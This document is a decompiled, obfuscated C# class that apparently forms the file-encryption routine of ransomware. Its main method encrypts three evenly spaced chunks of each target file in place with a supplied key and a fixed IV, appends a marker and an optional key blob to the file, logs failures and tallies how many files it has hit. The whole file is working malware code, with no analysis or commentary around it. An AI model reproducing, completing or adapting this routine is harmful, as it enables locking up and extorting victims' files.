using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using oFbodOYJTt;

namespace frgoWklvEOSV;

internal sealed class sRurvpLEXXDXV
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int htmzlFfeBkpo(long long_0)
	{
		return (int)long_0;
	}

	public static bool tTUpQRykitgwWL(string jXIdHCawsXijZL, string zAkOPAtlDqbSFA, string XvrCOqmsbhY, byte[] KWmumEbpCB = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(jXIdHCawsXijZL, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = htmzlFfeBkpo(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(zAkOPAtlDqbSFA) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(zAkOPAtlDqbSFA) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(zAkOPAtlDqbSFA) * 1024 * 1024) / 10;
				}
				int eNDkJtVJNDwCj = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = rZIGXEnDEaLr(jXIdHCawsXijZL, fileStream, eNDkJtVJNDwCj, num * i);
					array = (GRQFeQGQfBG.VGKELVlTFUV ? qTvYToAYGfnjeqK.RynnMPMCexwHcK(byte_, Encoding.ASCII.GetBytes(XvrCOqmsbhY), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RgELsEgHUCW.eUGEbOMOKENsBL(byte_, Encoding.ASCII.GetBytes(XvrCOqmsbhY), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					mrHILqqgVIsA(jXIdHCawsXijZL, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (GRQFeQGQfBG.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107398084)) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400261)) + Convert.ToString(zAkOPAtlDqbSFA) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400261))) : Encoding.ASCII.GetBytes(GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107398084)) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400302)) + Convert.ToString(zAkOPAtlDqbSFA) + GRQFeQGQfBG.PhXjLAIdTCy(getString_0(107400302))));
			if (!GRQFeQGQfBG.IooTTsvIiwCN)
			{
				using FileStream fileStream2 = new FileStream(jXIdHCawsXijZL, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(jXIdHCawsXijZL, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(KWmumEbpCB, 0, KWmumEbpCB.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (GRQFeQGQfBG.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(GRQFeQGQfBG.jnRLNtXuRRg, getString_0(107385724) + jXIdHCawsXijZL + getString_0(107398103) + ex.Message + getString_0(107396377));
				}
				catch (Exception)
				{
				}
			}
			GRQFeQGQfBG.iePhSHBTqLd++;
			return false;
		}
		GRQFeQGQfBG.XnicJWCgBOO++;
		return true;
	}

	public static byte[] rZIGXEnDEaLr(string ypmrseRSaYlFB, FileStream fVUMRnJdxhvMnH, int eNDkJtVJNDwCj, int GDrPedPBfck = 0)
	{
		byte[] array = new byte[eNDkJtVJNDwCj];
		fVUMRnJdxhvMnH.Position = GDrPedPBfck;
		fVUMRnJdxhvMnH.Read(array, 0, eNDkJtVJNDwCj);
		return array;
	}

	public static void mrHILqqgVIsA(string tOCblncKaPkQadxGw, FileStream CXRBJwzxkziP, byte[] YanNoxvygoBX, int vORjQHwkyX = 0)
	{
		CXRBJwzxkziP.Position = vORjQHwkyX;
		CXRBJwzxkziP.Write(YanNoxvygoBX, 0, YanNoxvygoBX.Length);
	}

	static sRurvpLEXXDXV()
	{
		Strings.CreateGetStringDelegate(typeof(sRurvpLEXXDXV));
	}
}
